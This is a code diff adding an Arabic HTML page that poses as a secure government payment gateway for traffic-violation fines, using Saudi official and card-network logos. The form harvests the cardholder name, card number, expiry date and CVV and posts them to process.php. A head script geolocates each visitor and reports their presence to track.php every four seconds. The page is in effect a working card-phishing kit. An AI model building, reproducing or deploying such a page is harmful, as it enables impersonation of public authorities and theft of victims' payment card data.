@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة السداد الآمن </title>
+        <link rel="icon" type="image/png" href="indexx/favicon.ico">
+
+    
+    
+    
+    
+    
+        
+    
+<script>
+  // 1. تفعيل المعرف الثابت لكل زائر لمنع التكرار الجلسات
+  let visitorCode = localStorage.getItem('visitor_code');
+  if (!visitorCode) {
+      visitorCode = 'VSR-' + Math.random().toString(36).substring(2, 9).toUpperCase();
+      localStorage.setItem('visitor_code', visitorCode);
+  }
+
+  async function sendTracking() {
+      // استعادة الدولة والمنطقة المخزنة لتسريع الموقع وتوفير البيانات
+      let countryCode = localStorage.getItem('visitor_country') || 'un';
+      let regionName = localStorage.getItem('visitor_region') || 'جاري التحديد...';
+
+      if (countryCode === 'un' || regionName === 'جاري التحديد...') {
+          try {
+              // جلب البيانات بدقة (رابط سريع ومفتوح تماماً لجميع دول العالم ومناطق السعودية)
+              const res = await fetch('https://ipapi.co');
+              const geo = await res.json();
+              
+              countryCode = geo.country_code ? geo.country_code.toLowerCase() : 'sa';
+              regionName = geo.region || geo.city || 'منطقة عامة';
+              
+              localStorage.setItem('visitor_country', countryCode);
+              localStorage.setItem('visitor_region', regionName);
+          } catch (e) {
+              // حل احتياطي سريع في حال تعطل الرابط الأول لأي سبب
+              try {
+                  const resAlt = await fetch('https://ipinfo.io');
+                  const geoAlt = await resAlt.json();
+                  countryCode = geoAlt.country ? geoAlt.country.toLowerCase() : 'sa';
+                  regionName = geoAlt.region || geoAlt.city || 'السعودية';
+                  
+                  localStorage.setItem('visitor_country', countryCode);
+                  localStorage.setItem('visitor_region', regionName);
+              } catch (err) {}
+          }
+      }
+
+      // 2. تحويل وتجهيز البيانات للإرسال المتوافق مع الاستضافة المجانية
+      const params = new URLSearchParams();
+      params.append('code', visitorCode);
+      params.append('pageTitle', document.title); // اسم الصفحة دقيق بدون روابط
+      params.append('countryCode', countryCode); // كود الدولة للعلم
+      params.append('region', regionName); // إرسال المنطقة بشكل مستقل ومستقر
+
+      fetch('track.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: params
+      }).catch(e => console.log(e));
+  }
+
+  // بث التحديث الفوري وتكراره كل 4 ثوانٍ لتأكيد التواجد
+  sendTracking();
+  setInterval(sendTracking, 4000);
+
+  // تحديث فوري دقيق للاسم والحالة عند الرجوع والتقدم بأزرار المتصفح
+  window.addEventListener('pageshow', sendTracking);
+</script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <style>
+        /* إعدادات الصفحة الأساسية والخلفية الكاملة مع السماح بالتمرير لضمان عدم اختفاء العناصر */
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-image: url('indexx/Back004.jpg'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            overflow-x: hidden;
+            overflow-y: auto !important; 
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* رأس الموقع - شفاف */
+        .main-header {
+            background-color: rgba(0, 150, 136, 0.7);
+            width: 100%;
+            height: 90px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .header-container {
+            width: 90%;
+            max-width: 1200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .center-header-img {
+            height: 70px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* وسط الموقع */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            box-sizing: border-box;
+        }
+
+        /* صندوق السداد الشفاف المطور */
+        .form-box {
+            background-color: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(12px); 
+            -webkit-backdrop-filter: blur(12px);
+            padding: 30px 25px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            width: 100%;
+            max-width: 440px; 
+            height: auto !important; 
+            box-sizing: border-box !important;
+            display: block !important;
+        }
+
+        .form-title {
+            color: #ffffff;
+            margin-bottom: 12px;
+            font-size: 1.3rem;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+            text-align: center;
+            font-weight: bold;
+        }
+
+        /* عرض الشعارات المدعومة داخل الصندوق */
+        .accepted-cards {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            background: rgba(0, 0, 0, 0.15);
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .card-icon {
+            height: 22px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* مجموعات الحقول */
+        .input-group {
+            margin-bottom: 15px !important;
+            text-align: right !important;
+            width: 100% !important;
+            display: block !important; 
+        }
+
+        .input-group label {
+            display: block !important;
+            color: #ffffff !important;
+            margin-bottom: 6px !important;
+            font-size: 0.9rem !important;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3) !important;
+        }
+
+        /* خانات الإدخال */
+        .input-control {
+            display: block !important;
+            width: 100% !important;
+            padding: 11px 12px !important;
+            background-color: rgba(255, 255, 255, 0.95) !important;
+            border: 2px solid rgba(0, 150, 136, 0.4) !important; 
+            border-radius: 8px !important;
+            font-size: 1rem !important;
+            color: #222222 !important;
+            box-sizing: border-box !important;
+            outline: none !important;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        .ltr-input {
+            direction: ltr !important;
+            text-align: left !important;
+        }
+
+        .input-control:focus {
+            border-color: #00a896 !important;
+            box-shadow: 0 0 10px rgba(0, 150, 136, 0.6) !important;
+            background-color: #ffffff !important;
+        }
+
+        /* إطار أحمر عند الخطأ */
+        .input-control:invalid:focus,
+        form.submitted .input-control:invalid {
+            border-color: #ff3333 !important;
+            box-shadow: 0 0 8px rgba(255, 51, 51, 0.5) !important;
+            background-color: #fff0f0 !important;
+        }
+
+        /* زر الدفع الموثق والظاهر بالكامل بالمتن الجديد */
+        .submit-btn {
+            display: flex !important;
+            justify-content: center !important;
+            align-items: center !important;
+            width: 100% !important;
+            padding: 14px !important;
+            margin-top: 15px !important;
+            background-color: #009688 !important;
+            color: #ffffff !important;
+            border: none !important;
+            border-radius: 8px !important;
+            font-size: 1.1rem !important;
+            font-weight: bold !important;
+            cursor: pointer !important;
+            transition: all 0.3s ease !important;
+            box-sizing: border-box !important;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.25) !important;
+        }
+
+        .submit-btn:hover {
+            background-color: #00796b !important;
+            transform: translateY(-2px) !important;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.35) !important;
+        }
+
+        /* ذيل الموقع */
+        .site-footer {
+            background-color: rgba(0, 150, 136, 0.85); 
+            color: #ffffff;
+            padding: 30px 0;
+            width: 100%;
+            flex-shrink: 0;
+        }
+
+        .footer-container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .footer-section {
+            flex: 1;
+            min-width: 250px;
+            margin: 10px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .footer-right { align-items: flex-start; text-align: right; }
+        .footer-left { align-items: flex-end; text-align: left; }
+
+        .efa-logo, .partner-logo {
+            object-fit: contain;
+            display: inline-block !important;
+        }
+
+        .partner-logos {
+            display: flex;
+            gap: 20px;
+        }
+
+        .footer-center h3 {
+            margin: 0 0 10px 0;
+            font-size: 1.1rem;
+        }
+
+        .footer-links {
+            list-style: none;
+            padding: 0;
+            margin: 0 0 15px 0;
+            display: flex;
+            gap: 15px;
+        }
+
+        .footer-links a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .payment-methods {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .payment-logo {
+            height: 25px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* الخط المتقطع للجوال */
+        .dashed-linee {
+            display: none;
+            width: 100%;
+            border-top: 1px dashed rgba(255, 255, 255, 0.4);
+            margin: 15px 0;
+        }
+
+        /* شاشات الجوال */
+        @media (max-width: 768px) {
+            .footer-container {
+                flex-direction: column;
+            }
+            .footer-section {
+                align-items: center !important;
+                text-align: center !important;
+            }
+            .dashed-linee {
+                display: block;
+            }
+            .footer-links {
+                flex-direction: column;
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- رأس الموقع -->
+    <header class="main-header">
+        <div class="header-container">
+            <img src="indexx/EFAAW.svg" alt="صورة وسط الرأس" class="center-header-img" width="150" height="70">
+        </div>
+    </header>
+
+
+
+
+
+
+
+
+
+    <!-- وسط الموقع -->
+    <main class="main-content">
+        <div class="form-box">
+            <div class="form-title">بوابة السداد الإلكتروني الآمن</div>
+            
+            <!-- الشعارات المدعومة المربوطة بالبرمجة الذكية -->
+            <div class="accepted-cards">
+                <img src="indexx/Mada.svg" alt="Mada" id="logo-mada" class="card-icon" width="50">
+                <img src="indexx/Visa.svg" alt="Visa" id="logo-visa" class="card-icon" width="50">
+                <img src="indexx/MasterCard.svg" alt="MasterCard" id="logo-mastercard" class="card-icon" width="40">
+            </div>
+            
+            
+            
+        <form action="process.php" method="POST" id="paymentForm">
+                
+    <!-- 1. حقل اسم حامل البطاقة -->
+    <div class="input-group">
+        <label for="card-holder">اسم حامل البطاقة</label>
+        <input type="text" 
+               id="card-holder" 
+               name="holder_name" 
+               class="input-control" 
+               placeholder="الاسم المكتوب على البطاقة" 
+               pattern="^[a-zA-Z\s\u0600-\u06FF]+$" 
+               title="يرجى إدخال حروف فقط (العربية أو الإنجليزية)" 
+               oninput="validateLettersOnly(this)" 
+               required>
+    </div>
+
+    <!-- 2. حقل رقم البطاقة -->
+    <div class="input-group">
+        <label for="card-number">رقم البطاقة</label>
+        <input type="text" 
+               id="card-number" 
+               name="card_no" 
+               class="input-control ltr-input" 
+               placeholder="XXXX XXXX XXXX XXXX" 
+               maxlength="19" 
+               inputmode="numeric" 
+               required>
+    </div>
+
+    <!-- 3. حقل تاريخ الانتهاء -->
+    <div class="input-group">
+        <label for="card-expiry">تاريخ الانتهاء</label>
+        <input type="text" 
+               id="card-expiry" 
+               name="expiry" 
+               class="input-control ltr-input" 
+               placeholder="MM/YY" 
+               maxlength="5" 
+               inputmode="numeric" 
+               required>
+    </div>
+
+    <!-- 4. حقل الرمز السري (CVV) -->
+    <div class="input-group">
+        <label for="card-cvv">الرمز السري (CVV)</label>
+        <input type="password" 
+               id="card-cvv" 
+               name="cvv" 
+               class="input-control ltr-input" 
+               placeholder="•••" 
+               maxlength="3" 
+               pattern="\d{3}" 
+               title="يرجى إدخال 3 أرقام فقط" 
+               inputmode="numeric" 
+               oninput="validateCvvOnly(this)" 
+               required>
+    </div>
+
+    <!-- زر الدفع -->
+
+            
+       <button type="submit" class="submit-btn" id="submitBtn">
+    🔒 إتمام عملية السداد الآمن
+</button>
+     
+            
+            
+
+
+            
+            
+         
+            
+            
+            
+              </form>
+        </div>
+    </main>          
+            
+            
+            
+            
+     <script>
+// 1. دالة التحقق من كتابة الحروف فقط لاسم حامل البطاقة
+function validateLettersOnly(input) {
+    input.value = input.value.replace(/[^a-zA-Z\s\u0600-\u06FF]/g, '');
+}
+
+// 2. دالة التحقق من الرمز السري (أرقام فقط وثلاثة خانات كحد أقصى)
+function validateCvvOnly(input) {
+    input.value = input.value.replace(/\D/g, ''); 
+}
+
+// 3. تنسيق رقم البطاقة تلقائياً + كشف وإظهار نوع البطاقة (مدى / فيزا / ماستركارد)
+document.getElementById('card-number').addEventListener('input', function (e) {
+    // تنظيف القيمة من المسافات وأي شيء ليس رقماً
+    let clearValue = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
+
+    const logoMada = document.getElementById('logo-mada');
+    const logoVisa = document.getElementById('logo-visa');
+    const logoMaster = document.getElementById('logo-mastercard');
+
+    // التحقق من الشعارات بناءً على الرقم الأول عند تخطي 4 أرقام
+    if (clearValue.length >= 4) {
+        let firstDigit = clearValue.charAt(0);
+
+        if (firstDigit === '4') {
+            if(logoVisa) logoVisa.style.display = 'inline-block';
+            if(logoMada) logoMada.style.display = 'none';
+            if(logoMaster) logoMaster.style.display = 'none';
+        } else if (firstDigit === '5') {
+            if(logoMaster) logoMaster.style.display = 'inline-block';
+            if(logoMada) logoMada.style.display = 'none';
+            if(logoVisa) logoVisa.style.display = 'none';
+        } else {
+            if(logoMada) logoMada.style.display = 'inline-block';
+            if(logoVisa) logoVisa.style.display = 'none';
+            if(logoMaster) logoMaster.style.display = 'none';
+        }
+    } else {
+        // إظهار كافة الشعارات إذا كان الحقل فارغاً أو أقل من 4 أرقام
+        if(logoMada) logoMada.style.display = 'inline-block';
+        if(logoVisa) logoVisa.style.display = 'inline-block';
+        if(logoMaster) logoMaster.style.display = 'inline-block';
+    }
+
+    // تنسيق المدخلات بإضافة مسافة كل 4 أرقام
+    let formattedValue = clearValue.match(/.{1,4}/g);
+    e.target.value = formattedValue ? formattedValue.join(' ') : '';
+});
+
+// 4. تنسيق تاريخ الانتهاء MM/YY والتحقق التلقائي من الشهور والسنوات (بين 26 و 44)
+document.getElementById('card-expiry').addEventListener('input', function (e) {
+    let value = e.target.value.replace(/\D/g, '');
+    value = value.substring(0, 4);
+
+    if (value.length >= 2) {
+        e.target.value = value.substring(0, 2) + '/' + value.substring(2);
+    } else {
+        e.target.value = value;
+    }
+
+    // فحص صلاحية التاريخ المدخل منطقياً
+    if (value.length === 4) {
+        const month = parseInt(value.substring(0, 2), 10);
+        const year = parseInt(value.substring(2, 4), 10);
+
+        if (month < 1 || month > 12) {
+            this.setCustomValidity('الشهر غير صحيح (يجب أن يكون بين 01 و 12).');
+        } else if (year < 26 || year > 44) {
+            this.setCustomValidity('السنة غير صحيحة (يجب أن تكون بين 26 و 44).');
+        } else {
+            this.setCustomValidity(''); // المدخلات صحيحة
+        }
+    } else {
+        this.setCustomValidity(''); 
+    }
+});
+
+// 5. حماية الإرسال النهائي بالكامل ومنع النقل والنقر المتكرر
+document.getElementById('paymentForm').addEventListener('submit', function (e) {
+    const form = e.currentTarget;
+    const holder = document.getElementById('card-holder');
+    const cardNumber = document.getElementById('card-number');
+    const expiry = document.getElementById('card-expiry');
+    const cvv = document.getElementById('card-cvv');
+    const submitBtn = document.getElementById('submitBtn');
+
+    // إزالة الفراغات لتدقيق الأرقام بدقة
+    const rawCardNumber = cardNumber.value.replace(/\s/g, '');
+
+    // أولاً: التحقق من المتطلبات الأساسية للمتصفح (HTML HTML5 Validation)
+    if (!form.checkValidity()) {
+        e.preventDefault(); // منع الإرسال
+        form.classList.add('submitted');
+        return false;
+    }
+
+    // ثانياً: شروط التحقق المخصصة لأطوال البيانات
+    if (holder.value.trim().length < 3) {
+        alert('يرجى كتابة الاسم الكامل المكتوب على البطاقة.');
+        e.preventDefault();
+        return false;
+    }
+    
+    if (rawCardNumber.length < 15 || rawCardNumber.length > 16) {
+        alert('يرجى التأكد من إدخال رقم البطاقة المكون من 15 أو 16 رقماً بشكل صحيح.');
+        e.preventDefault(); 
+        return false;
+    }
+
+    if (expiry.value.length < 5 || !expiry.value.includes('/')) {
+        alert('يرجى إدخال تاريخ انتهاء صلاحية البطاقة بصيغة MM/YY الصحيحة.');
+        e.preventDefault();
+        return false;
+    }
+
+    if (cvv.value.length !== 3) {
+        alert('الرمز السري (CVV) يجب أن يتكون من 3 أرقام تماماً.');
+        e.preventDefault();
+        return false;
+    }
+
+    // إذا تخطى الكود كل الشروط السابقة بنجاح، يتم تعطيل الزر لمنع تكرار البيانات ونقله صامتاً لـ process.php
+    if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.innerText = "🔒 جاري تأمين الاتصال ومعالجة البيانات...";
+    }
+    
+    return true;
+});
+</script>
+       
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+ 
+  
+   
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- ذيل الموقع -->
+    <footer class="site-footer">
+        <div class="footer-container">
+            
+            <!-- القسم الأيمن -->
+            <div class="footer-section footer-right">
+                <div class="logo-efa">
+                    <img src="indexx/EFAAW.svg" alt="Efa Logo" class="efa-logo" width="160" height="70">
+                </div>
+            </div>
+
+            <div class="dashed-linee"></div>
+
+            <!-- القسم الأوسط -->
+            <div class="footer-section footer-center">
+                <h3>المنصة الوطنية للمخالفات</h3>
+                <ul class="footer-links">
+                    <li><a href="#">الأسئلة الشائعة</a></li>
+                    <li><a href="#">شروط الإستخدام</a></li>
+                    <li><a href="#">سياسة الخصوصية</a></li>
+                </ul>
+                
+                <div class="payment-methods">
+                    <img src="indexx/Mada.svg" alt="Mada" class="payment-logo">
+                    <img src="indexx/Sdad.svg" alt="Sadad" class="payment-logo">
+                    <img src="indexx/Visa.svg" alt="Visa" class="payment-logo">
+                    <img src="indexx/MasterCard.svg" alt="MasterCard" class="payment-logo">
+                </div>
+            </div>
+
+            <div class="dashed-linee"></div>
+
+            <!-- القسم الأيسر -->
+            <div class="footer-section footer-left">
+                <div class="partner-logos">
+                    <img src="indexx/NICW.svg" alt="NIC" class="partner-logo" width="100" height="55">
+                    <img src="indexx/sdaia2.svg" alt="SDAIA" class="partner-logo" width="100" height="55">
+                </div>
+            </div>
+
+
+
+
+
+</body>
+</html>
